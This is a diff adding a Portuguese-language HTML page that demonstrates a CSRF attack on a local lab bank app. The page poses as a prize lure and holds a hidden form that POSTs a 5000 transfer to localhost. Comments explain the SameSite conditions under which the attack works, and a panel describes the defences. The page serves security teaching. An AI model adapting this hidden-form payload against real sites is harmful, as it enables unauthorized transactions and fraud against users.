@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <title>Você ganhou um prêmio! 🎁</title>
+  <style>
+    body { font-family: Arial, sans-serif; background: #1a1a2e; color: #eee; text-align: center; padding: 40px; }
+    h1 { color: #f4c430; font-size: 2rem; }
+    .fake-content { max-width: 500px; margin: 20px auto; background: #16213e; padding: 30px; border-radius: 12px; }
+    .btn { background: #e94560; color: white; border: none; padding: 12px 30px; border-radius: 8px;
+           font-size: 1rem; cursor: pointer; margin-top: 20px; }
+    .log { background: #0f3460; border-radius: 8px; padding: 15px; margin-top: 20px;
+           text-align: left; font-family: monospace; font-size: 0.75rem; color: #4ade80; }
+    .warn { color: #fbbf24; }
+    .info { color: #93c5fd; }
+  </style>
+</head>
+<body>
+  <h1>🎁 Parabéns! Você foi selecionado!</h1>
+  <div class="fake-content">
+    <p>Esta é uma simulação de página maliciosa servida de origem externa.</p>
+    <p>Em um ataque real, esta página estaria em outro domínio (ex: premio-fake.com).</p>
+    <p class="warn">⚠️ Um formulário oculto será enviado automaticamente para o SafeBank!</p>
+
+    <!-- FORMULÁRIO OCULTO — o ataque clássico de CSRF via form HTML -->
+    <!--
+      IMPORTANTE: Este ataque cross-origin via form-submit FUNCIONA quando:
+        - O cookie NÃO tem SameSite=Strict
+        - O navegador tem SameSite=Lax ou None configurado
+
+      No Chrome moderno (80+), o padrão é SameSite=Lax, que BLOQUEIA form POST cross-origin.
+      Para demonstrar o ataque real, altere o cookie para SameSite=None no servidor.
+
+      O ataque via FETCH cross-origin requer:
+        - Cookie SameSite=None; Secure
+        - Header Access-Control-Allow-Credentials: true no servidor
+    -->
+    <form id="csrf-attack" action="http://localhost:3000/api/transfer" method="POST"
+          enctype="application/x-www-form-urlencoded" style="display:none">
+      <input type="hidden" name="to" value="bob" />
+      <input type="hidden" name="amount" value="5000" />
+    </form>
+
+    <div class="log" id="log">
+      <div class="info">[sistema] Aguardando execução do ataque...</div>
+    </div>
+
+    <button class="btn" onclick="executeAttack()">Executar Ataque (form submit)</button>
+  </div>
+
+  <div style="max-width:500px;margin:20px auto;background:#1e293b;padding:20px;border-radius:12px;text-align:left;font-size:0.8rem">
+    <h3 style="color:#f4c430">📚 Contexto Educacional</h3>
+    <p>Esta página representa o que um atacante hospedaria em outro domínio.</p>
+    <p style="margin-top:10px"><strong>Como o ataque funciona:</strong></p>
+    <ol style="margin-top:8px;padding-left:20px;line-height:1.8">
+      <li>Vítima está logada no SafeBank (tem o cookie <code>session_id</code>)</li>
+      <li>Vítima clica num link malicioso (e-mail, anúncio, etc.)</li>
+      <li>A página do atacante envia formulário automaticamente para o banco</li>
+      <li>O navegador inclui o cookie de sessão na requisição</li>
+      <li>O servidor processa a transferência como legítima</li>
+    </ol>
+    <p style="margin-top:10px;color:#f87171">
+      <strong>Proteção:</strong> Token CSRF único por sessão + SameSite=Strict no cookie
+    </p>
+  </div>
+
+  <script>
+    function log(msg, type = 'info') {
+      const el = document.getElementById('log')
+      const time = new Date().toLocaleTimeString('pt-BR')
+      el.innerHTML += `<div class="${type}">[${time}] ${msg}</div>`
+    }
+
+    function executeAttack() {
+      log('Iniciando ataque CSRF via form submit cross-origin...', 'warn')
+      log('Formulário apontando para: http://localhost:3000/api/transfer', 'info')
+      log('Payload: to=bob&amount=5000', 'info')
+      log('O navegador irá anexar o cookie session_id automaticamente!', 'warn')
+      log('Submetendo formulário em 2 segundos...', 'info')
+
+      setTimeout(() => {
+        log('Submetendo...', 'warn')
+        document.getElementById('csrf-attack').submit()
+      }, 2000)
+    }
+
+    // Auto-executa após 1.5s simulando script silencioso
+    window.onload = () => {
+      setTimeout(() => {
+        log('Script malicioso ativado silenciosamente!', 'warn')
+        log('(Em ataque real, isso seria invisível para o usuário)', 'info')
+      }, 1500)
+    }
+  </script>
+</body>
+</html>
